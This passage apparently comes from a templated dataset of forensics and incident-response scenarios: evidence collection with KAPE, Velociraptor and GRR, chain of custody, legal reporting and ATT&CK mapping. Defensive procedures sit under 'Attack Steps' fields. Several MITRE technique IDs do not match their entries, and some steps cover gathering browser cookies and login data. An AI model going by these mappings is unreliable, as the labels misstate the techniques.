- **Attack Steps**: 1. On the suspect machine, run KAPE using the Target: Browsers module. 2. Select the correct destination directory for artifacts. 3. Let KAPE collect history, cookies, and bookmarks from Chrome, Firefox, and Edge. 4. Use Modules: Browsers to parse raw history into CSV/SQLite. 5. Analyze visited URLs for suspicious domains. 6. Use tools like BrowsingHistoryView or Hindsight for better visualization. 7. Identify download links or login attempts on phishing sites. 8. Extract cookie/session data if available. 9. Correlate browser activity with timestamps from phishing email or malware drop. 10. Document findings for potential C2 or credential exfiltration paths.
- **Detection**: Network logs + KAPE browser data
- **Solution**: Enforce DNS logging + training + browser forensics retention
- **Tags**: kape, browsers, phishing, timeline

## Collecting and Parsing Windows Event Logs Across Multiple Hosts

- **Attack Type**: Remote Log Collection
- **Target**: Corporate Windows Network
- **Vulnerability**: No centralized logging
- **MITRE**: T1021
- **Impact**: Reveals attacker movement between hosts
- **Tools**: Velociraptor
- **Scenario**: The SOC wants to remotely collect Security Event Logs (EVTX) from 100+ machines for lateral movement detection.
- **Attack Steps**: 1. Deploy Velociraptor agents to all endpoints in the target network. 2. Use a Velociraptor hunt to collect Windows.EventLogs.Security. 3. Set parameters to only fetch logs from the breach timeframe (e.g., last 48 hours). 4. Execute the hunt and monitor download status. 5. Once logs are collected, parse them using Velociraptor’s built-in log parser or export to .evtx. 6. Use LogParser, EventLog Explorer, or Sigma rules for analysis. 7. Filter logs for 4624, 4672, 4688 to identify suspicious logons. 8. Correlate with attacker behavior patterns (e.g., service creation, token abuse). 9. Store all collected logs centrally for further triage. 10. Generate timeline charts to visualize lateral movement.
- **Detection**: Event IDs + cross-host correlation
- **Solution**: Centralized log aggregation (SIEM)
- **Tags**: eventlogs, velociraptor, lateral movement

## Scheduled Live Memory Capture with GRR

- **Attack Type**: Memory Forensics
- **Target**: Enterprise Servers
- **Vulnerability**: Living-off-the-land persistence
- **MITRE**: T1055
- **Impact**: Detects malware only running in memory
- **Tools**: GRR Rapid Response
- **Scenario**: A threat actor is suspected to reappear at certain hours; the team wants to schedule automatic memory dumps.
- **Attack Steps**: 1. Deploy GRR agents to all systems under watch. 2. From the GRR GUI, define a memory collection flow (MemoryCollector). 3. Set a schedule (e.g., daily at 2 AM) when attacker is likely active. 4. Select appropriate endpoints. 5. Let GRR collect RAM dumps in .raw or .aff4 format. 6. Download memory images after each run. 7. Use Volatility or Rekall to analyze the dumps. 8. Look for injected processes, malicious DLLs, or suspicious network connections. 9. Compare daily memory results for consistency. 10. Flag any anomalous process or patterns indicating attacker persistence.
- **Detection**: Memory anomalies, YARA on dumps
- **Solution**: Memory capture policies + GRR alerting
- **Tags**: grr, memory, scheduled forensics

## Detecting Data Exfiltration Tools via Prefetch with KAPE

- **Attack Type**: Executable Triage
- **Target**: Internal Workstation
- **Vulnerability**: Insider misuse
- **MITRE**: T1030
- **Impact**: Reveals tool-based exfil method
- **Tools**: KAPE
- **Scenario**: After suspected data theft, the IR team must find evidence of tools like WinSCP or 7zip used during the breach.
- **Attack Steps**: 1. Use KAPE with Target: Prefetch to extract .pf files. 2. Use Modules: PECmd to parse and format prefetch entries. 3. Search for high-frequency executions of archiving or transfer tools. 4. Review execution timestamps and file locations. 5. Identify command-line arguments (if present) indicating file targets. 6. Correlate timestamps with observed network spikes. 7. Compare tool paths with known admin tool directories. 8. Verify hashes of involved binaries for tampering. 9. Document execution trail and exfil vectors. 10. Build detection logic around unauthorized archiving or transfer activity.
- **Detection**: Prefetch execution logs
- **Solution**: Monitor tool usage and command line activity
- **Tags**: prefetch, kape, exfiltration

## Detecting Malicious WMI Execution via Velociraptor

- **Attack Type**: Remote Scripting Detection
- **Target**: Windows Enterprise
- **Vulnerability**: WMI-based persistence
- **MITRE**: T1047
- **Impact**: Detects stealthy script execution via WMI
- **Tools**: Velociraptor
- **Scenario**: Attackers are suspected of using WMI to run malicious scripts across multiple hosts.
- **Attack Steps**: 1. Launch a Velociraptor hunt using artifact Windows.WMI.EventConsumer. 2. Target all systems active during the breach period. 3. Collect WMI class instances and consumer bindings. 4. Look for suspicious ActiveScriptEventConsumer or persistent CommandLineEventConsumer. 5. Identify commands/scripts triggered through WMI. 6. Compare against known benign scripts from internal baselines. 7. Flag obfuscated or encoded PowerShell execution. 8. Correlate with scheduled tasks or lateral movement. 9. Remove malicious WMI objects if verified. 10. Set monitoring to catch future WMI persistence.
- **Detection**: Velociraptor WMI artifacts
- **Solution**: Remove rogue consumers and log future WMI use
- **Tags**: wmi, velociraptor, persistence

## Full Browser & Cookie Dump with GRR

- **Attack Type**: Web Forensics
- **Target**: End-user Laptop
- **Vulnerability**: Credential theft
- **MITRE**: T1539
- **Impact**: Reveals how credentials or sessions were stolen
- **Tools**: GRR Rapid Response
- **Scenario**: IR team needs full browser profile including cookies and sessions for stolen credentials investigation.
- **Attack Steps**: 1. Create a GRR flow to collect browser data (Chrome, Firefox, Edge). 2. Set file paths such as AppData\Local\Google\Chrome\User Data\Default\Cookies. 3. Include Login Data, History, and Local Storage. 4. Execute the flow on suspected endpoints. 5. Retrieve SQLite DB files from each browser. 6. Use tools like DB Browser for SQLite to parse cookies and login info. 7. Check for third-party trackers, active sessions, and auth tokens. 8. Identify logins to attacker-controlled services or C2. 9. Preserve cookie/session data for legal chain-of-custody. 10. Alert security teams to revoke affected sessions.
- **Detection**: Browser cookies + logins
- **Solution**: Session invalidation + MFA enforcement
- **Tags**: grr, cookies, browser, creds

## Registry Persistence Detection with KAPE + SigMA

- **Attack Type**: Registry Analysis
- **Target**: Windows System
- **Vulnerability**: Registry autorun abuse
- **MITRE**: T1547.001
- **Impact**: Detects registry-based persistence
- **Tools**: KAPE
- **Scenario**: Analysts suspect persistence via Run keys in registry.
- **Attack Steps**: 1. Use KAPE’s Target: RegistryHives to extract NTUSER.DAT and SYSTEM. 2. Apply Modules: Registry Explorer or RECmd to parse hives. 3. Search for Software\Microsoft\Windows\CurrentVersion\Run and RunOnce. 4. Check values for suspicious or obfuscated binaries. 5. Extract timestamps and parent paths. 6. Correlate with Prefetch, SRUM, and Event Logs. 7. Validate if files still exist or were deleted. 8. Use Sigma rules to match against known persistence indicators. 9. Document malicious keys and remove them securely. 10. Set GPO to audit registry key changes in future.
- **Detection**: Registry diffing + execution validation
- **Solution**: Remove keys + monitor key creation
- **Tags**: registry, kape, sigma

## File Collection from Remote Endpoint with GRR

- **Attack Type**: Remote Triage
- **Target**: Remote Host
- **Vulnerability**: Uncontrolled file access
- **MITRE**: T1005
- **Impact**: Reveals sensitive file exfil or staging
- **Tools**: GRR Rapid Response
- **Scenario**: An analyst wants to remotely fetch specific file types (e.g., .docx, .zip) from a target user’s system.
- **Attack Steps**: 1. In the GRR console, define a File Finder flow. 2. Input file patterns like C:\Users\*\Documents\*.zip or *.docx. 3. Run the flow on the selected endpoint. 4. GRR will collect matching files and bundle them. 5. Download the zip package from the GRR interface. 6. Use 7-Zip or Forensic ToolKit to review the contents. 7. Check for documents exfiltrated or staged for theft. 8. Compare metadata with file system timestamps. 9. Validate digital signatures (if any). 10. Archive results and log chain-of-custody.
- **Detection**: File metadata + hashes + context
- **Solution**: File access policy enforcement
- **Tags**: grr, files, remote triage

## Correlating Tool Artifacts Across Frameworks

- **Attack Type**: Multi-Tool Analysis
- **Target**: Entire Environment
- **Vulnerability**: Partial view with single tool
- **MITRE**: T1087
- **Impact**: Full attacker chain reconstruction
- **Tools**: KAPE, Velociraptor, GRR
- **Scenario**: Analysts combine artifacts from KAPE, Velociraptor, and GRR to reconstruct full attack chain.
- **Attack Steps**: 1. Collect registry, event logs, and prefetch using KAPE. 2. Simultaneously use Velociraptor for memory and WMI analysis. 3. Task GRR with remote file collection and scheduled memory captures. 4. Normalize data across all tools (CSV, JSON). 5. Import all artifacts into Timesketch or custom timeline analysis tool. 6. Overlay artifacts by timestamp and event ID. 7. Identify attacker activity sequence — tool usage, persistence, movement. 8. Highlight inconsistencies or missing periods. 9. Document attacker playbook from multi-source view. 10. Build automation scripts for cross-tool DFIR workflows.
- **Detection**: Timeline analysis + tool correlation
- **Solution**: Use multiple frameworks for visibility
- **Tags**: dfir, correlation, kape, grr, velociraptor

## Chain of Custody for Memory Image

- **Attack Type**: Forensic Evidence Handling
- **Target**: Workstation
- **Vulnerability**: Mishandling or tampering of evidence
- **MITRE**: T1005
- **Impact**: Evidence inadmissibility in court
- **Tools**: FTK Imager, Excel, HashCalc
- **Scenario**: An analyst acquires a memory image from a compromised system and needs to ensure its integrity is maintained throughout the investigation.
- **Attack Steps**: 1. Boot into trusted live OS or use FTK Imager on the compromised system.2. Acquire memory image and save to external drive.3. Immediately compute MD5 and SHA256 hashes of the memory dump.4. Document acquisition time, analyst identity, system details in a spreadsheet.5. Store hash values, device serials, and file names in the chain of custody form.6. Sign and date the documentation, maintaining custody logs for each transfer.7. Store original image in a secure, write-protected location.8. Use copies for analysis while preserving the original.9. Have all involved personnel sign each handoff in the log.10. Present chain log if evidence is challenged.
- **Detection**: Hash mismatch or missing timestamps
- **Solution**: Maintain a signed chain of custody log and hash validation
- **Tags**: chain-of-custody, memory-dump, evidence-integrity

## Mapping TTPs from Parsed Log Artifacts

- **Attack Type**: TTP Attribution
- **Target**: Enterprise Endpoint
- **Vulnerability**: Lack of visibility or context
- **MITRE**: T1086, T1021
- **Impact**: Incomplete attacker attribution
- **Tools**: KAPE, Sigma, ATT&CK Navigator
- **Scenario**: A SOC analyst uses parsed logs to identify attacker behavior and map it to MITRE techniques.
- **Attack Steps**: 1. Use KAPE to collect Windows event logs and application logs.2. Parse the logs and extract process creation events, login anomalies, and PowerShell commands.3. Analyze log timestamps and user context for each event.4. Use Sigma rules to correlate suspicious activity (e.g., lateral movement via SMB).5. For each action, map to a corresponding ATT&CK technique (e.g., T1021 for SMB/Remote Services).6. Visualize the attack flow using ATT&CK Navigator.7. Note the techniques used in a report timeline.8. Group TTPs based on stages: Initial Access, Privilege Escalation, etc.9. Present this mapping as part of final forensic report.10. Ensure each technique has log evidence to support the mapping.
- **Detection**: Log correlation and timeline mapping
- **Solution**: Build report timelines with MITRE ATT&CK mappings
- **Tags**: mitre-attack, sigma, log-analysis

## Creating an Evidence Handling SOP

- **Attack Type**: Operational SOP Development
- **Target**: Organizational Workflow
- **Vulnerability**: Inconsistent evidence handling
- **MITRE**: N/A
- **Impact**: Case failure due to mishandling
- **Tools**: Microsoft Word, ISO/IEC 27037, Google Drive
- **Scenario**: An IR team documents a standardized process for handling digital evidence across all cases.
- **Attack Steps**: 1. Review international standards like ISO/IEC 27037 on digital evidence handling.2. Identify key stages: acquisition, transport, storage, analysis.3. Define roles and responsibilities (e.g., forensic analyst, evidence custodian).4. Specify how hashes are to be generated and verified.5. Describe physical and digital storage requirements (e.g., safe, WORM storage).6. Include procedures for documenting each step (e.g., form templates).7. Create flowcharts showing evidence handling lifecycle.8. Store SOP securely in version-controlled document repository.9. Share and train all team members on SOP.10. Periodically review and update SOP.
- **Detection**: Auditing SOP adherence
- **Solution**: Centralize and standardize procedures in an official SOP
- **Tags**: evidence-handling, sop, iso27037

## Legal Collaboration for Data Breach Case

- **Attack Type**: Legal Reporting
- **Target**: Corporate Legal Department
- **Vulnerability**: Unadmissible evidence
- **MITRE**: N/A
- **Impact**: Failure to pursue legal action
- **Tools**: Email, PDFs, Chain of Custody Forms
- **Scenario**: During a breach investigation, the forensic team must prepare evidence for legal review.
- **Attack Steps**: 1. Finish forensic analysis and summarize key findings in a structured format.2. Identify all evidence used (images, logs, scripts).3. Validate integrity with cryptographic hashes.4. Prepare chain of custody reports for each item.5. Convert reports and logs into legally readable PDFs.6. Meet with legal counsel to review relevance and admissibility.7. Explain technical findings in non-technical language.8. Address potential chain breaks or analysis gaps.9. Provide signed declaration of analyst’s involvement.10. Support legal team during regulatory or criminal proceedings.
- **Detection**: Legal feedback loop
- **Solution**: Translate forensic artifacts for legal usability
- **Tags**: legal-evidence, breach-response, compliance

## Digital Timeline Report Compilation

- **Attack Type**: Report Generation
- **Target**: Endpoint & Artifact Repos
- **Vulnerability**: Time desynchronization, missing logs
- **MITRE**: T1033, T1053
- **Impact**: Ambiguous attacker narrative
- **Tools**: Plaso, Timesketch, Excel
- **Scenario**: An analyst prepares a timeline of attacker activity using multiple artifacts.
- **Attack Steps**: 1. Parse MFT, Registry, $Logfile, Event Logs using Plaso.2. Ingest parsed data into Timesketch.3. Tag suspicious events (e.g., program execution, account creation).4. Filter out noise and irrelevant entries.5. Reconstruct attacker sequence based on timestamp and user context.6. Export timeline to Excel for formatting.7. Add column for mapped MITRE TTPs.8. Include legend to explain tags and sources.9. Export final report to PDF.10. Archive all files and tools used for reproducibility.
- **Detection**: Cross-artifact time correlation
- **Solution**: Maintain timestamp integrity and align logs
- **Tags**: timeline-report, plaso, ttp-mapping

## Maintaining Audit Trail of USB Evidence

- **Attack Type**: Physical Evidence Chain
- **Target**: Removable Media
- **Vulnerability**: Physical tampering
- **MITRE**: T1005
- **Impact**: Loss of credibility in court
- **Tools**: Paper Chain Form, Tamper-evident Bag
- **Scenario**: A USB drive containing an image of the suspect’s system is handled by multiple teams during investigation.
- **Attack Steps**: 1. Label the USB with case ID and analyst initials.2. Place USB in tamper-evident bag with unique serial number.3. Complete chain of custody form: date/time, purpose, analyst name.4. Store USB in secured evidence locker with access logs.5. Every time USB is removed for analysis, log transfer and reason.6. After use, rebag with a new seal and log hash check.7. Final storage in long-term evidence vault.8. Scan and archive custody forms digitally.9. Provide audit trail upon request by compliance or court.10. Use barcode or RFID tagging for efficiency.
- **Detection**: Physical custody log and evidence seal
- **Solution**: Track every transfer with timestamp and initials
- **Tags**: usb-evidence, audit-trail, chain-of-custody

## Documenting Email Phishing Campaign Findings

- **Attack Type**: Email-based Threat Reporting
- **Target**: Email Infrastructure
- **Vulnerability**: Email security misconfiguration
- **MITRE**: T1566.001
- **Impact**: Repeated phishing incidents
- **Tools**: Outlook Message Headers, KAPE, IOC Extractor
- **Scenario**: The IR team investigates a phishing campaign and needs to create a structured report with timeline, IOCs, and recommendations.
- **Attack Steps**: 1. Retrieve sample phishing emails and extract full headers.2. Parse attachment metadata and inspect for macro/script payloads.3. Extract and document IOCs (domains, IPs, hashes).4. Map timeline of email delivery and victim clicks.5. Use ATT&CK to classify the delivery and execution techniques.6. Create a timeline of events from delivery to detection.7. Draft a report summarizing methods, impact, IOCs.8. Include recommendations (email filters, awareness training).9. Validate all timestamps.10. Submit to SOC manager and legal.
- **Detection**: Phishing IOC correlation and log validation
- **Solution**: Report with mitigation advice and visual timelines
- **Tags**: phishing, email-iocs, timeline-report

## Reporting Command-Line Based Lateral Movement

- **Attack Type**: Command-Based Movement Tracking
- **Target**: Windows Server Network
- **Vulnerability**: Lack of PowerShell logging
- **MITRE**: T1021, T1059
- **Impact**: Missed detection of lateral hops
- **Tools**: Event Logs, PowerShell Logs, CMD History
- **Scenario**: Analyst reconstructs how the attacker laterally moved using command-line tools.
- **Attack Steps**: 1. Extract Windows Event IDs (e.g., 4688, 7045) and PowerShell logs.2. Identify remote command executions like PsExec or WinRM.3. Correlate command lines with user accounts and time of use.4. Map each command to attacker objective (e.g., credential dumping).5. Create report showing progression of attacker’s movement.6. Document TTPs using MITRE technique mappings.7. Visualize the chain using arrows and time labels.8. Add pre- and post-conditions to each command.9. Include screenshots of logs where applicable.10. Ensure all evidence is backed by logs and hashes.
- **Detection**: CMD and PowerShell history validation
- **Solution**: Correlate command history with remote execution
- **Tags**: command-line, lateral-movement, attacker-report

## Archiving Reports with Immutable Storage

- **Attack Type**: Long-Term Preservation
- **Target**: Legal Archive System
- **Vulnerability**: Report tampering post-investigation
- **MITRE**: N/A
- **Impact**: Loss of integrity over time
- **Tools**: AWS S3 Glacier, WORM Drives
- **Scenario**: Forensic reports and supporting artifacts are archived in tamper-proof format for legal and audit use.
- **Attack Steps**: 1. Finalize investigation report and export to PDF/A.2. Bundle all logs, hashes, screenshots in an evidence folder.3. Compress and generate SHA256 hash of entire bundle.4. Upload to write-once storage like AWS S3 Glacier or WORM drive.5. Enable versioning and access logging on archive system.6. Document archive location in the case tracking database.7. Restrict access to select custodians.8. Periodically test access and hash consistency.9. Create redundancy with offline copy.10. Record archive metadata in final case closure report.
- **Detection**: Immutable backup check
- **Solution**: Use write-once archival with logs and hashes
- **Tags**: report-archiving, worm-storage, legal-trail

## Evidence Summary Sheet for Executive Briefing

- **Attack Type**: Non-Technical Reporting
- **Target**: Executive Management
- **Vulnerability**: Complexity of forensic language
- **MITRE**: N/A
- **Impact**: Executive misunderstanding
- **Tools**: PowerPoint, Excel
- **Scenario**: A senior executive requests a one-pager summarizing the incident response findings.
- **Attack Steps**: 1. Extract key events from timeline and logs.2. Summarize attacker TTPs without technical jargon.3. Add impact description in business terms (e.g., downtime, data leak).4. Include visual timeline or simple chart.5. Create bullet list of actions taken and current status.6. Highlight lessons learned and future defenses.7. Review with incident lead and SOC.8. Finalize in clean slide or one-pager.9. Get approval from leadership before distribution.10. Store copy in incident archive.
- **Detection**: Simplified incident summary
- **Solution**: Translate technical content for leadership clarity
- **Tags**: exec-report, summary-sheet, dfir-briefing

## Documenting Live Response Artifacts for Legal Submission

- **Attack Type**: Evidence Chain Documentation
- **Target**: Endpoint
- **Vulnerability**: Lack of procedural integrity
- **MITRE**: T1070
- **Impact**: Evidence inadmissibility
- **Tools**: FTK Imager, Notepad, Excel
- **Scenario**: An IR team collects volatile data from RAM and needs to ensure the chain of custody is legally defensible.
- **Attack Steps**: 1. Begin live response and record system time and operator name. 2. Launch FTK Imager to acquire a live memory image. 3. Save logs and screenshot collection steps. 4. Document exact hash values (MD5/SHA256) of the memory dump. 5. Record the operator actions in a log file with timestamps. 6. Prepare a chain-of-custody form noting collection date/time, collected by, handed to, and storage location. 7. Store digital and physical copies in a secure container or encrypted storage. 8. Verify artifact integrity by rechecking hashes before submission. 9. Include this documentation as part of the legal disclosure packet. 10. Submit to legal team for audit validation.
- **Detection**: Hash verification, log audits
- **Solution**: Maintain formal chain-of-custody logs and hashing reports
- **Tags**: chain-of-custody, legal-proof, live-memory

## Creating a TTP-Mapped Incident Timeline

- **Attack Type**: Timeline & Behavior Mapping
- **Target**: Enterprise Network
- **Vulnerability**: Missing TTP mapping
- **MITRE**: T1589
- **Impact**: Limited threat intelligence value
- **Tools**: Timesketch, MITRE ATT&CK Navigator, Plaso
- **Scenario**: Analysts want to align attacker activities with MITRE ATT&CK for intelligence sharing.
- **Attack Steps**: 1. Parse host data using Plaso to extract log timelines. 2. Load timelines into Timesketch and identify key events (logins, lateral movement). 3. For each event, identify corresponding TTP using MITRE ATT&CK (e.g., lateral movement → T1021). 4. Use the Navigator to color-code techniques observed during the attack. 5. Annotate each sketch event with matching MITRE technique IDs. 6. Link each timeline entry to its source (event log, prefetch, etc.). 7. Review the full timeline for sequence gaps or stealthy behavior. 8. Export the mapped TTP report to a PDF or HTML format. 9. Include analyst commentary describing each phase. 10. Share the final report with internal teams and ISAC groups.
- **Detection**: Timeline-to-TTP validation
- **Solution**: Standardize ATT&CK mapping in post-mortem reports
- **Tags**: mitre-mapping, incident-timeline, intel-sharing

## Maintaining Integrity of Exported Prefetch Data

- **Attack Type**: Evidence Preservation
- **Target**: Endpoint
- **Vulnerability**: Evidence modification risk
- **MITRE**: T1057
- **Impact**: Unreliable file metadata
- **Tools**: PEcmd, 7-Zip, SHA256sum
- **Scenario**: After parsing Prefetch files, a forensic examiner must ensure exported copies remain tamper-proof.
- **Attack Steps**: 1. Parse the system's Prefetch folder using PEcmd to extract execution metadata. 2. Export all .pf files to a forensic evidence folder. 3. Use SHA256sum to generate hash values for each file. 4. Save hashes in a signed checksum file. 5. Compress the entire Prefetch folder and hash file into a 7-Zip archive. 6. Set archive password and encryption. 7. Transfer the archive to secure offline storage. 8. Record transfer time, handler name, and device in custody form. 9. Periodically revalidate hashes if accessed. 10. Note integrity verification in final report.
- **Detection**: File hash mismatch detection
- **Solution**: Encrypt and hash exported forensic artifacts
- **Tags**: prefetch, hashing, integrity-preservation

## Logging KAPE Module Results for Legal Continuity

- **Attack Type**: Tool Output Logging
- **Target**: Workstation
- **Vulnerability**: Legal evidence ambiguity
- **MITRE**: T1119
- **Impact**: Audit failure
- **Tools**: KAPE, Notepad++, Excel
- **Scenario**: A team uses KAPE to extract registry hives and browser history and wants proper legal documentation.
- **Attack Steps**: 1. Run KAPE with appropriate targets (e.g., BrowserHistory, RegistryHives). 2. Save the module output to a write-protected drive. 3. Generate a report summarizing each module's output path and timestamp. 4. Record hash values for all output directories. 5. Create a log file describing the module used, operator name, and system ID. 6. Insert screenshots of terminal and GUI operations. 7. Store log files alongside module outputs in secure folders. 8. Record the handling chain for these outputs. 9. Attach all this as evidence appendix in the case report. 10. Use consistent folder naming for audit trail (e.g., Hostname_Date_KAPE).
- **Detection**: Module output hashes and handler logs
- **Solution**: Ensure module outputs are logged with handler metadata
- **Tags**: kape, legal-logging, module-results

## Recording Email Headers as Evidence

- **Attack Type**: Evidence Collection & Formatting
- **Target**: Email Server
- **Vulnerability**: Header tampering or loss
- **MITRE**: T1566
- **Impact**: Legal non-admissibility
- **Tools**: Outlook, Notepad, HashMyFiles
- **Scenario**: A spear-phishing attack is investigated, and analysts must extract and preserve email header metadata for legal use.
- **Attack Steps**: 1. Open the malicious email in Outlook. 2. View "Message Options" and extract full internet headers. 3. Copy headers to a plain-text file. 4. Name file clearly (e.g., Header_Victim1_SuspiciousEmail.txt). 5. Hash the header file using SHA256 and save the hash separately. 6. Record email subject, timestamp, and sender in a log. 7. Cross-check timestamps against inbound email logs. 8. Compress and encrypt the email header file and log. 9. Transfer to secure incident evidence folder. 10. Record all actions in the chain-of-custody log.
- **Detection**: Email metadata mismatch
- **Solution**: Extract, hash, and log header separately
- **Tags**: spearphishing, email-header, evidence

## Creating a Legal Timeline from Windows Event Logs

- **Attack Type**: Chronological Reporting
- **Target**: Windows Server
- **Vulnerability**: Ambiguous event order
- **MITRE**: T1078
- **Impact**: Misinterpreted legal record
- **Tools**: Event Log Explorer, Notepad++, Timesketch
- **Scenario**: A legal team requests a narrative of attacker actions, reconstructed from Windows event logs.
- **Attack Steps**: 1. Export relevant event logs (Security, System, Application) from the suspect machine. 2. Import into Event Log Explorer to search for events like logon, privilege escalation, service creation. 3. Sort events chronologically and identify attack phases. 4. Use Notepad++ to summarize findings with Event ID, time, and description. 5. Map each log action to attacker TTPs if possible. 6. Note system time zone settings to avoid timeline drift. 7. Draft a report section with headings: Initial Access, Execution, Persistence. 8. Review timeline with internal legal and compliance teams. 9. Highlight key events for legal emphasis. 10. Save logs and report in secure, timestamped folders.
- **Detection**: Timestamp audit, timezone cross-check
- **Solution**: Include timezone context and TTP mapping
- **Tags**: event-logs, timeline-reconstruction, legal-proof

## Correlating Registry and Event Logs for Reporting

- **Attack Type**: Multi-Source Correlation
- **Target**: Windows Host
- **Vulnerability**: Mislinked evidence
- **MITRE**: T1547
- **Impact**: Incomplete forensic mapping
- **Tools**: RegRipper, Event Viewer, Timesketch
- **Scenario**: Analysts correlate registry keys (persistence) and event logs (execution) for report writing.
- **Attack Steps**: 1. Use RegRipper to extract auto-run keys and services entries from registry. 2. Review keys for suspicious executables or paths. 3. Export Event Logs and filter for process execution (e.g., Event ID 4688). 4. Correlate timestamps from registry keys with nearby Event Log entries. 5. Build a report table showing Registry Key → Associated Event ID → Execution Path. 6. Annotate entries with observed persistence technique (e.g., run key abuse). 7. Map actions to MITRE (e.g., T1547). 8. Insert the correlation table into the final forensic report. 9. Log tool versions and analyst notes. 10. Save both tool outputs and report sections in case folder.
- **Detection**: Timestamp & artifact sync check
- **Solution**: Use structured correlation tables in reports
- **Tags**: registry-correlation, execution, report-writing

## Ensuring Evidence Tamper Alerts via Integrity Monitoring

- **Attack Type**: Evidence Integrity Assurance
- **Target**: Evidence Repository
- **Vulnerability**: Silent modification
- **MITRE**: T1070
- **Impact**: Evidence compromised
- **Tools**: Tripwire, Hashdeep
- **Scenario**: Post-acquisition, forensic images are monitored for unauthorized changes.
- **Attack Steps**: 1. Place acquired disk images and logs into monitored directories. 2. Use Hashdeep to create baseline hashes for all files. 3. Configure Tripwire to watch the evidence directory for any change. 4. If a change occurs, trigger email/SIEM alert. 5. Document all integrity check configurations. 6. Run periodic manual hash re-verification. 7. Include monitoring tool logs in the final chain-of-custody report. 8. Review alert logs weekly and attach summaries to case files. 9. Set up alerts for unauthorized USB or file access to the folder. 10. Archive monitoring configuration snapshots with the evidence.
- **Detection**: Tripwire alerts, hash diffs
- **Solution**: Configure file integrity monitoring for evidence folders
- **Tags**: evidence-monitoring, tripwire, integrity-alerts

## Generating a Legally Structured Forensic Report

- **Attack Type**: Legal Reporting
- **Target**: Legal Team
- **Vulnerability**: Informal report structure
- **MITRE**: T1036
- **Impact**: Report inadmissibility
- **Tools**: Microsoft Word, PDF-XChange, Markdown
- **Scenario**: A forensic examiner must draft a final report that will be submitted in court.
- **Attack Steps**: 1. Create a template with sections: Executive Summary, Timeline, Technical Analysis, TTP Mapping, Evidence Table. 2. Populate each section using validated tool outputs. 3. Insert all hash values of collected data. 4. Include analyst name, date of analysis, and tools used. 5. Reference all figures and screenshots. 6. Add table listing every file collected and its hash. 7. Cross-reference MITRE TTPs in a dedicated section. 8. Ensure use of neutral, objective language. 9. Export the report as PDF and digitally sign it. 10. Submit report to internal legal team for verification.
- **Detection**: Legal review & formatting checklist
- **Solution**: Use court-accepted templates and clear format
- **Tags**: legal-reporting, evidence-table, pdf-signing

## Capturing and Verifying Interview Notes During DFIR

- **Attack Type**: Human Artifact Preservation
- **Target**: Human Testimony
- **Vulnerability**: Missing validation record
- **MITRE**: T1201
- **Impact**: Disputed interview content
- **Tools**: OneNote, Print-to-PDF, SHA256sum
- **Scenario**: During investigation interviews, analyst notes must be captured, timestamped, and legally preserved.
- **Attack Steps**: 1. Conduct interviews with stakeholders during IR. 2. Take structured notes in OneNote with timestamps. 3. After interview, print notes to PDF. 4. Use SHA256sum to generate hash of PDF. 5. Log hash and interviewer name in chain-of-custody doc. 6. Include summary of interview findings in the report appendix. 7. Secure PDF and hash in evidence folder. 8. Review notes with legal for tone and clarity. 9. Insert footnotes in report linking to interview where used. 10. Reconfirm content with interviewee for validation if required.
- **Detection**: Hash matching and interview logs
- **Solution**: Digitally hash interview notes and store securely
- **Tags**: dfir-interview, notes-preservation, legal-proof

## Chain of Custody Using Digital Signatures

- **Attack Type**: Evidence Tampering
- **Target**: Workstation
- **Vulnerability**: Lack of evidence verification
- **MITRE**: T1565.001
- **Impact**: Legal inadmissibility of evidence
- **Tools**: OpenSSL, HashCalc, Windows CertUtil
- **Scenario**: Incident response team needs to preserve the integrity of log files by digitally signing them to prove no tampering occurred.
- **Attack Steps**: 1. Collect relevant log files (e.g., firewall, auth logs). 2. Use a hash tool (like HashCalc) to generate a SHA-256 checksum of each file. 3. Record the hashes in a secure evidence log. 4. Use OpenSSL or Windows CertUtil to apply a digital signature using the team's private key. 5. Store both the original files and signed hash logs in a secure drive. 6. During review or transfer, reverify hash values to ensure no changes. 7. Maintain detailed chain-of-custody entries each time the file is handled.
- **Detection**: Verify mismatched hashes; alert on unsigned files
- **Solution**: Apply digital signatures and store hash logs securely
- **Tags**: chain of custody, hashing, digital signature

## Evidence Containerization for Legal Teams

- **Attack Type**: Legal Handoff
- **Target**: Legal
- **Vulnerability**: Insecure transfer or incomplete documentation
- **MITRE**: T1557
- **Impact**: Leaked or discredited evidence
- **Tools**: FTK Imager, EnCase, 7-Zip
- **Scenario**: A forensic team prepares evidence in a legal-friendly container for external counsel.
- **Attack Steps**: 1. Acquire disk image or key artifacts using FTK Imager. 2. Export relevant files to a dedicated case folder. 3. Use EnCase to build a logical evidence file (L01) or archive using 7-Zip with AES encryption. 4. Create a README.txt with context, timestamps, and hash values. 5. Encrypt the container and transfer via secure channel to legal team. 6. Share encryption key separately (e.g., in person or via secure call). 7. Retain a local copy with audit logs of the transfer.
- **Detection**: Monitor audit logs of evidence handoff
- **Solution**: Use encrypted containers with hash logs
- **Tags**: evidence packaging, legal reporting

## Mapping Timeline to MITRE TTPs

- **Attack Type**: TTP Mapping
- **Target**: Enterprise Network
- **Vulnerability**: Analyst unfamiliarity with ATT&CK
- **MITRE**: T1087, T1033
- **Impact**: Weak attribution of attacker steps
- **Tools**: Timesketch, MITRE Navigator, ELK Stack
- **Scenario**: An analyst builds a report by aligning observed behavior to MITRE ATT&CK techniques.
- **Attack Steps**: 1. Collect parsed log artifacts (event logs, web access, registry changes). 2. Import timeline into Timesketch or visualize using ELK. 3. For each event, identify attacker objectives (e.g., persistence, privilege escalation). 4. Use MITRE ATT&CK Navigator to map the activity (e.g., T1059 for command execution). 5. Document each technique in a dedicated report section. 6. Include artifacts supporting each TTP (screenshot, hash, timestamp). 7. Review with another analyst for validation.
- **Detection**: Cross-check multiple events with TTP map
- **Solution**: Visualize and verify against MITRE framework
- **Tags**: mitre mapping, attack chain

## Maintaining Chain of Custody During Remote Response

- **Attack Type**: Evidence Tracking
- **Target**: Remote Workstation
- **Vulnerability**: Break in custody during remote access
- **MITRE**: T1070
- **Impact**: Contaminated or disqualified evidence
- **Tools**: Velociraptor, GRR, Chainkit
- **Scenario**: A remote IR analyst collects memory and files from a remote system and needs to preserve handling history.
- **Attack Steps**: 1. Use Velociraptor to remotely initiate memory and file collection. 2. Log the analyst’s identity and time of acquisition in case log. 3. Collect cryptographic hashes immediately after acquisition. 4. Store files in a read-only evidence drive. 5. Record the hash, acquisition method, and system info in a custody log (manual or Chainkit). 6. Any subsequent access/modification must be logged with time and reason. 7. Securely archive logs and collected evidence with write-protection.
- **Detection**: Monitor all changes via audit chain
- **Solution**: Use live remote acquisition with logging
- **Tags**: remote acquisition, custody logging

## Report Structure for Legal Proceedings

